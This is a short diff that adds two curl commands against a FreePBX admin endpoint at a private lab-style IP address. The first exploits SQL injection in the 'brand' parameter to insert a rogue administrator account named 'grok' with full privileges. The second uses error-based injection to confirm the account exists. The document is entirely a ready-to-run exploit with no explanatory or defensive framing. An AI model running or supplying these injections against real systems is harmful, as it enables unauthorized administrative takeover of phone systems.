@@ -1,0 +1,2 @@
+curl -i -k "https://10.129.15.5/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x%27;INSERT+INTO+ampusers+(username,password_sha1,extension_low,extension_high,deptname,sections)+VALUES+(%27grok%27,%275baa61e4c9b93f3f0682250b6cf8331b7ee68fd8%27,0,0,%27%27,%27%2A%27)--+"
+curl -i -k "https://10.129.15.5/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x%27+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+username+FROM+ampusers+WHERE+username=%27grok%27),0x7e))+--+"
